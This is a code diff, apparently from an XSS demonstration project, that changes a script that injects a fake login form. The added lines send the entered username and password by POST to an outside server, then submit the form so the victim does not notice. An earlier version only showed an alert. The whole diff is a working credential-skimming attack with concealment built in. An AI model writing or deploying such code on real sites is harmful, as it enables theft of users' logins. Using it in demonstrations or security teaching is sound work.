@@ -94,9 +94,21 @@ window.onload = function onWindowLoad() {
     form.appendChild(formFields.submit);
 
     // do something malicious with their login information
-    formFields.submit.onclick = (event) => {
-        // ENHANCE: we could remove this preventDefault() to allow the user to log in. This would possibly allow the attack to fly under their radar.
+    formFields.submit.onclick = async (event) => {
         event.preventDefault();
-        alert(`You've just been hacked! I now have your username and password.\n\nuser: ${formFields.user.value}\npass: ${formFields.pass.value}`)
+
+        await fetch('https://xss-demo-api.herokuapp.com/users', {
+            method: 'POST',
+            body: JSON.stringify({
+                username: formFields.user.value,
+                password: formFields.pass.value,
+            }),
+            headers: {
+                'Content-type': 'application/json; charset=UTF-8'
+            }
+        });
+
+        // continue with form submission. user won't know that any malicious code was run.
+        form.submit();
     }
 } 
